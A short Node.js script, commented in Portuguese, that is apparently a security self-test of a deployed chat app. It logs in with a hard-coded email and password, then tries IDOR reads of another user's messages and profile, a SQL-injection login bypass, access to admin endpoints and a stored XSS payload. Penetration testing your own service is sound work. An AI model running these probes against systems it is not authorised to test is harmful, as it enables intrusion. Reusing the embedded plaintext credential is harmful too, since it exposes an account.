const https = require('https');

function makeRequest(method, path, data, cookies) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'vault-chat-nlu3.onrender.com',
      path: path,
      method: method,
      headers: {
        'Content-Type': 'application/json'
      }
    };
    
    if (cookies) {
      options.headers['Cookie'] = cookies;
    }
    
    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        const setCookie = res.headers['set-cookie'];
        resolve({ status: res.statusCode, body, setCookie });
      });
    });
    
    req.on('error', reject);
    
    if (data) {
      req.write(JSON.stringify(data));
    }
    req.end();
  });
}

async function runTests() {
  console.log('🧪 INICIANDO TESTES DE SEGURANÇA\n');
  
  // Teste 1: Login
  console.log('=== TESTE 1: LOGIN ===');
  const loginRes = await makeRequest('POST', '/api/auth/login', {
    email: 'bruno@vault.app',
    password: 'Bruno@123456'
  });
  console.log('Status:', loginRes.status);
  console.log('Resposta:', loginRes.body);
  
  const cookies = loginRes.setCookie?.[0]?.split(';')[0];
  console.log('Cookie:', cookies);
  
  // Teste 2: IDOR - Acessar dados de outro
  console.log('\n=== TESTE 2: IDOR ===');
  
  // Ver mensagens de outro usuário
  const msgRes = await makeRequest('GET', '/api/messages/u3', null, cookies);
  console.log('Mensagens de u3:', msgRes.status, msgRes.body);
  
  // Ver perfil de outro
  const userRes = await makeRequest('GET', '/api/users/u3', null, cookies);
  console.log('Perfil u3:', userRes.status, userRes.body);
  
  // Teste 3: Auth Bypass
  console.log('\n=== TESTE 3: AUTH BYPASS ===');
  const bypassRes = await makeRequest('POST', '/api/auth/login', {
    email: "' OR '1'='1",
    password: "' OR '1'='1"
  });
  console.log('Bypass tentativa:', bypassRes.status, bypassRes.body);
  
  // Teste 4: Privilege Escalation
  console.log('\n=== TESTE 4: PRIVILEGE ESCALATION ===');
  const adminRes = await makeRequest('GET', '/api/admin/stats', null, cookies);
  console.log('Acesso admin:', adminRes.status, adminRes.body);
  
  const adminUsersRes = await makeRequest('GET', '/api/admin/users', null, cookies);
  console.log('Lista users admin:', adminUsersRes.status, adminUsersRes.body);
  
  // Teste 5: XSS
  console.log('\n=== TESTE 5: XSS ===');
  const xssRes = await makeRequest('POST', '/api/messages', {
    to: 'u3',
    text: '<script>alert("XSS")</script>'
  }, cookies);
  console.log('XSS tentativa:', xssRes.status, xssRes.body);
  
  console.log('\n✅ TESTES CONCLUÍDOS');
}

runTests().catch(console.error);
